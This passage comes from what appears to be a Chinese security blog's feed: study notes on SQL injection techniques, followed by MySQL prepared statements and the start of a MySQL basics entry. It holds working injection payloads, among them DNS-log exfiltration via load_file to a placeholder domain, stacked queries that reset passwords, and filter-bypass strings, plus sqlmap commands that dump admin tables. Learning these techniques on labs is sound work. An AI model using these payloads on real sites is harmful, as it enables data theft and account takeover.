class="hljs-keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=tablename <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.域名/任意文件&quot;))) <span class="hljs-comment">--+</span><br><br>获得数据类似<br></code></pre></td></tr></table></figure><p>注意：域名前要加’.’，并且必须使用concat拼接否则无法执行</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>函数addslashes()</p><p><img src="/../image/addslashes.png"></p><hr><p>addslashes()过滤作用</p><p><img src="/../image/addslashes%E8%BF%87%E6%BB%A4%E4%BD%9C%E7%94%A8.png"></p><p>宽字节注入主要用来对抗addslashes()过滤</p><p>GBKB编码和宽字节注入原理：</p><p><img src="/../image/GBKB%E7%BC%96%E7%A0%81.png"></p><p>宽字节注入前提：要求对方Mysql数据库的编码方式是GBK编码，并且发请求时声明客户端用的也是GBK编码</p><p>注入步骤（less-32）：</p><p><img src="/../image/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4.png"></p><h3 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h3><p>适用场景：知道表名，但是不知道列名时可以使用偏移量注入；但是实现条件苛刻</p><p>注意：联合查询前面的查询语句列数要比注入的union后面的查询列数要多才能用偏移量注入</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><p>如果要控制回显的内容只需要控制*号的位置即可，因为查询所有数据但是可能页面只展示几列数据，且列与列需要对应</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">例如：<br>注意：如果<span class="hljs-operator">*</span>在中间或者后面写的时候格式：表名.<span class="hljs-operator">*</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,users.<span class="hljs-operator">*</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,users.<span class="hljs-operator">*</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,users.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><p>控制偏移：</p><p><img src="/../image/%E5%81%8F%E7%A7%BB%E9%87%8F%E6%B3%A8%E5%85%A5.png"></p><h3 id="加密注入"><a href="#加密注入" class="headerlink" title="加密注入"></a>加密注入</h3><p>前端提交的有些数据是加密之后，到了后台再解密，然后再进行数据库查询等相关操作的，那么既然如此我们也应该将注入语句按照相同的加密方式，加密后再进行注入</p><p>步骤：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.先将前端提交数据解密<br>2.添加注入语句<br>3.将添加后的语句再加密然后发送<br></code></pre></td></tr></table></figure><p>例如：<img src="/../image/%E5%8A%A0%E5%AF%86%E6%B3%A8%E5%85%A5.png"></p><p>注意：如果发现前端提交数据中有一个或两个等号，一般是base64编码，当然也可能没有等号</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例</p><p><img src="/../image/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A51.png"></p><p>执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1&#x27;;update<span class="hljs-built_in"> users </span><span class="hljs-built_in">set</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;123456&#x27;</span> where <span class="hljs-attribute">id</span>=1; --+ <br></code></pre></td></tr></table></figure><p>意思就是再更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句</p><p><img src="/../image/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A52.png"></p><p>堆叠查询的局限性</p><pre><code>   堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</code></pre><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>什么是二次注入：</p><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用</p><p>可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p><p>二次注入原理：</p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>图示：</p><p><strong>二次注入的原理，主要分为两步</strong></p><p><strong>第一步：插入恶意数据</strong></p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p><p><strong>第二步：引入恶意数据</strong></p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。早下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p><p><img src="/../image/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A52.png"></p><p><strong>二次注入示例：</strong></p><p>*<strong>寻找插入数据库，并会转义的操作*</strong></p><p>输入参数1’ –&gt;参数经过转义函数1\‘ –&gt;参数进入数据库还原为1’</p><p>*<strong>寻找另一处引用这个数据的操作*</strong></p><p>将1‘从数据库中取出–&gt;取出后直接给变量并带入SQL–&gt;SQL注入触发</p><p>示例：sqli-libs Less-24</p><p><img src="/../image/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5.png"></p><p>利用二次注入修改密码从而得到密码</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>大体意思就是将传参用base64编码,再与url进行拼接。在开启htt服务用sqlmap或其他工具进行测试这个文件即可.</p><p>首先构造文件:</p><p><img src="/../image/%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5.png"></p><p>大体意思就是将传参用base64编码,再与url进行拼接。</p><p>其中base64_decode()函数是将传入的参数进行base64编码。</p><p>file_get_contents()函数是用来将文件的内容读入到一个字符串中的首选方法。</p><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>在日常的测试中，经常会遇到静态页面，尤其是政府类的站点（前提经过授权），此时就会非常的棘手，在下多试验后，发现以下思路或可以帮助我们跨越这个障碍。</p><p>伪静态即是网站本身是动态网页如.php、.asp、.aspx等格式动态网页有时这类动态网页还跟“?”加参数来读取数据库内不同资料。很典型的案例即是discuz论坛系统，后台就有一个设置伪静态功能，开启伪静态后，动态网页即被转换重写成静态网页类型页面，通过浏览器访问地址和真的静态页面没区别。前提服务器支持伪静态重写URL Rewrite功能</p><p>判断方法：</p><p>在浏览器里控制台（console),输入代码或粘贴js代码</p><p>alert(document.lastModified); 回车执行，会弹出一个弹窗。</p><p><img src="https://md-1312988675.cos.ap-nanjing.myqcloud.com/wenimg/202409140959227.png?imageSlim" alt="image-20240914095932187"></p><p>重新刷新网页，再用相同的方法在控制台里输入查询代码，再查看文件的最后修改时间，如果发现<strong>时间不同</strong>则可以判断它是伪静态。</p><p><img src="https://md-1312988675.cos.ap-nanjing.myqcloud.com/wenimg/202409141000934.png?imageSlim" alt="image-20240914100039887"></p><p>如果是伪静态页面，可以尝试将其变成动态页面。伪静态的话只是由动态转成了静态，从地址上你是可以看到转递参数的，比如phpweb，它的链接是这样的：news&#x2F;?123.html，这个你可以理解成news.php?id&#x3D;123。所以你可以news&#x2F;?123*.html这样提交。或者可以进行伪静态中转。（伪静态中转注入总结：博客园地址）</p><p>入侵的大概思维方式</p><p>对搜索框进行测试（注入测试）<br> 对登录处进行测试（万能密码、注入）<br> 对站点进行目录扫描（发现其他突破口）<br> 从C段下手</p><h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h3><h4 id="注释符过滤"><a href="#注释符过滤" class="headerlink" title="注释符过滤"></a>注释符过滤</h4><p><img src="/../image/%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87.png"></p><h4 id="and-和or过滤绕过"><a href="#and-和or过滤绕过" class="headerlink" title="and 和or过滤绕过"></a>and 和or过滤绕过</h4><p>过滤源代码</p><p><img src="/../image/and%E5%92%8Cor%E8%BF%87%E6%BB%A4.png"></p><p>使用场景：</p><p>在报错内发现and和or被过滤</p><p>简单常用的绕过手法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.使用大小写绕过<br>例如：?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">anD</span> <span class="hljs-attribute">1</span>=1--+<br><br>2.复写过滤字符<br>例如：?<span class="hljs-attribute">id</span>=1&#x27; anandd <span class="hljs-attribute">1</span>=1--+<br><br>3.用&amp;&amp;取代<span class="hljs-keyword">and</span>，用||取代<span class="hljs-keyword">or</span><br>例如：?<span class="hljs-attribute">id</span>=1&#x27; &amp;&amp; <span class="hljs-attribute">1</span>=1--+<br>注意：尝试未成功可以转换成url编码再试一遍<br></code></pre></td></tr></table></figure><h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>使用场景：</p><p><img src="/../image/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%872.png"></p><p>发现空格被过滤</p><p><img src="/../image/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87.png"></p><p>例子：less-26</p><p><img src="/../image/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A43.png"></p><p>逐个测试发现%A0可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;union%A0select%A01,database(),3%A0oorr&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>注意：这里or也被过滤了所以要使用复写,且注释符被过滤<br></code></pre></td></tr></table></figure><p>如果还是不行尝试报错注入</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;||extractvalue(1,concat(&#x27;~&#x27;,(database())))||&#x27;1&#x27;=&#x27;1<br>没有用到空格<br><br>admin&quot;||(extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)));#<br><br>查表名<br><span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<br>注意：这里<span class="hljs-keyword">or</span>被过滤所以复写<br><br>查列名<br><span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())anandd(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)<br><br>查内容<br><span class="hljs-keyword">select</span>(concat(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(users)<span class="hljs-keyword">where</span>(id=<span class="hljs-number">1</span>)<br><br>多用括号()以达到不适用空格的效果<span class="hljs-keyword">and</span>和<span class="hljs-keyword">or</span>复写<br></code></pre></td></tr></table></figure><p>limit替换函数</p><p><img src="/../image/limit%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0.png"></p><h4 id="逗号过滤绕过"><a href="#逗号过滤绕过" class="headerlink" title="逗号过滤绕过"></a>逗号过滤绕过</h4><p>join绕过逗号限制的原理</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">使用<span class="hljs-keyword">join</span>:<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> #等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c<span class="hljs-punctuation">;</span><br><br>例如：<br>查表名<br>?id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database())c<span class="hljs-punctuation">;</span><br><br>查内容时<br>?id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users)c<span class="hljs-punctuation">;</span><br>?id=-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> users)c<span class="hljs-punctuation">;</span><br><br>由于逗号被过滤所以只能一个个查<br></code></pre></td></tr></table></figure><p>适用场景：</p><p>报错后发现逗号被过滤</p><h4 id="绕过union和select过滤"><a href="#绕过union和select过滤" class="headerlink" title="绕过union和select过滤"></a>绕过union和select过滤</h4><p><img src="/../image/union%E5%92%8Cselect%E7%BB%95%E8%BF%87.png"></p><p>还可以使用报错注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;||updatexml(1,concat(&#x27;</span>$<span class="hljs-string">&#x27;,(database())),0)or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br></code></pre></td></tr></table></figure><p>还可以尝试url编码绕过</p><p><img src="/../image/union%E5%92%8Cselect%E7%BB%95%E8%BF%872.png"></p><h2 id="sqlmap工具的使用"><a href="#sqlmap工具的使用" class="headerlink" title="sqlmap工具的使用"></a>sqlmap工具的使用</h2><h4 id="①检查注入点："><a href="#①检查注入点：" class="headerlink" title="①检查注入点："></a>①检查注入点：</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11</p><h4 id="②爆所有数据库信息："><a href="#②爆所有数据库信息：" class="headerlink" title="②爆所有数据库信息："></a>②爆所有数据库信息：</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –dbs</p><h4 id="③爆当前数据库信息："><a href="#③爆当前数据库信息：" class="headerlink" title="③爆当前数据库信息："></a>③爆当前数据库信息：</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –current-db</p><h4 id="④指定库名列出所有表"><a href="#④指定库名列出所有表" class="headerlink" title="④指定库名列出所有表"></a>④指定库名列出所有表</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 –tables</p><p>‘vhost48330’ 为指定数据库名称</p><h4 id="⑤指定库名表名列出所有字段"><a href="#⑤指定库名表名列出所有字段" class="headerlink" title="⑤指定库名表名列出所有字段"></a>⑤指定库名表名列出所有字段</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin –columns<br> ‘admin’ 为指定表名称</p><h4 id="⑥指定库名表名字段dump出指定字段"><a href="#⑥指定库名表名字段dump出指定字段" class="headerlink" title="⑥指定库名表名字段dump出指定字段"></a>⑥指定库名表名字段dump出指定字段</h4><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin -C ac，id，password –dump<br> ‘ac,id,password’ 为指定字段名称</p><hr><h2 id="sql预处理"><a href="#sql预处理" class="headerlink" title="sql预处理"></a>sql预处理</h2><h3 id="MySQL传统处理："><a href="#MySQL传统处理：" class="headerlink" title="MySQL传统处理："></a>MySQL传统处理：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">客户端准备<span class="hljs-keyword">sql</span>语句<br><br>发送<span class="hljs-keyword">sql</span>语句到MySQL服务器<br><br>MySQL服务器执行<span class="hljs-keyword">sql</span>语句<br><br>服务器执行结果返回客户端<br>复制代码<span class="hljs-number">1234567</span><br></code></pre></td></tr></table></figure><h3 id="预处理基本策略："><a href="#预处理基本策略：" class="headerlink" title="预处理基本策略："></a>预处理基本策略：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">将<span class="hljs-keyword">sql</span>语句强制一分为二：<br>第一部分为前面相同命令和结构部分<br>第二部分为后面可变数据部分<br>首先将前面的<span class="hljs-keyword">sql</span>语句发送给MySQL服务器，让其先执行溢出预处理（并没有真正的执行）第一次发送<span class="hljs-keyword">sql</span>语句的时候将其中可变的数据部<br>复制代码<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h3 id="不带参数的预处理"><a href="#不带参数的预处理" class="headerlink" title="不带参数的预处理"></a>不带参数的预处理</h3><p><strong>准备预处理语句</strong></p><p>prepare 语句名称 from “预处理的sql语句”;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">prepare st <span class="hljs-selector-tag">from</span> &quot;<span class="hljs-selector-tag">select</span> * <span class="hljs-selector-tag">from</span> pdo&quot;;<br></code></pre></td></tr></table></figure><p><strong>执行预处理语句</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">execute st<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>删除预处理语句</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">prepare</span> st;<br></code></pre></td></tr></table></figure><h3 id="带参数的预处理"><a href="#带参数的预处理" class="headerlink" title="带参数的预处理"></a>带参数的预处理</h3><p><strong>准备预处理语句</strong></p><figure class="highlight mizar"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mizar">prepare <span class="hljs-keyword">st</span> <span class="hljs-keyword">from</span> &quot;select * <span class="hljs-keyword">from</span> pdo where id = ?&quot;;<br></code></pre></td></tr></table></figure><p><strong>定义参数变量</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> @<span class="hljs-attribute">id</span>=2;<br></code></pre></td></tr></table></figure><p><strong>传参，执行预处理</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">execute</span> st <span class="hljs-keyword">using</span> <span class="hljs-variable">@id</span>; <br></code></pre></td></tr></table></figure><p><strong>删除</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">prepare</span> st;<br></code></pre></td></tr></table></figure><h2 id="handler命令与实现方法"><a href="#handler命令与实现方法" class="headerlink" title="handler命令与实现方法"></a>handler命令与实现方法</h2><p>[HANDLER语法_MySQL 中文文档 (mysqlzh.com)](<a href="https://www.mysqlzh.com/doc/126/253.html#:~:text=HANDLER">https://www.mysqlzh.com/doc/126/253.html#:~:text=HANDLER</a> 语句提供通往表存储引擎接口的直接通道。 HANDLER 可以用于 MyISAM 和 InnoDB,表。 HANDLER…OPEN 语句用于打开一个表，通过后续的 HANDLER…READ 语句建立读取表的通道。 本表目标不会被其它线程共享，也不会关闭，直到线程调用 HANDLER…CLOSE 或线程中止时为止。)</p><p><strong>说明</strong>：在SQL中，HANDLER 是用于直接访问表的一种方式。HANDLER 语句用于打开表，并为后续操作提供对表的直接访问。</p><p>(1)handler table_name open as hd; 指定数据表进行载入并返回句柄</p><p>(2)handler hd read first; 读取指定表&#x2F;句柄的首航数据</p><p>(3)handler hd read next; 读取指定表&#x2F;句柄的下一行数据</p><p>(4)handler hd close; 关闭句柄</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,…) [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT … ]<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125; [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT … ]<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125; [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT … ]      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>主健,无索引指定<br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br></code></pre></td></tr></table></figure><h2 id="无列名注入和innoDb引擎"><a href="#无列名注入和innoDb引擎" class="headerlink" title="无列名注入和innoDb引擎"></a>无列名注入和innoDb引擎</h2><p><a href="https://blog.csdn.net/qq_66013948/article/details/136424994">SQL注入之 无列名注入 原理详解</a></p><p><strong>union无列名注入</strong></p><p><strong>join无列名注入</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/2024/12/29/MySQL/"/>
      <url>/2024/12/29/MySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>数据库的相关概念：</p><p><img src="/../image/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E5%BF%B5.png"></p><p>客户端的连接：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -u root -<span class="hljs-selector-tag">p</span><br>mysql <span class="hljs-selector-attr">[-h 指定主机地址]</span> <span class="hljs-selector-attr">[-P 指定连接端口]</span> -u 指定连接用户名 -<span class="hljs-selector-tag">p</span> 指定密码<br></code></pre></td></tr></table></figure><p>数据模型：</p><p><img src="/../image/%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B.png"></p><p>关系型数据库</p><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库</p><p>特点：</p><p>1.使用表结构存储数据，格式统一，便于维护</p><p>2.使用SQL语言操作，标准统一，使用方便</p><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="SQL通用语法及分类"><a href="#SQL通用语法及分类" class="headerlink" title="SQL通用语法及分类"></a>SQL通用语法及分类</h2><h3 id="SQL通用语法"><a href="#SQL通用语法" class="headerlink" title="SQL通用语法"></a>SQL通用语法</h3><ol><li><p>SQL语句可以单行或多行书写，以分号结尾。</p></li><li><p>SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。</p></li><li><p>MySQL数据库的SQL语句不区分大小写，关键字建议使用大写</p></li><li><p>注释：</p><p>单行注释：–注释内容 或者 # 注释内容（MySQL特有）</p><p>多行注释：&#x2F;*注释内容*&#x2F;</p></li></ol><h2 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h2><p>SQL分类：</p><p><img src="/../image/SQL%E5%88%86%E7%B1%BB.png"></p><h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="DDL-数据库操作"><a href="#DDL-数据库操作" class="headerlink" title="DDL-数据库操作"></a>DDL-数据库操作</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 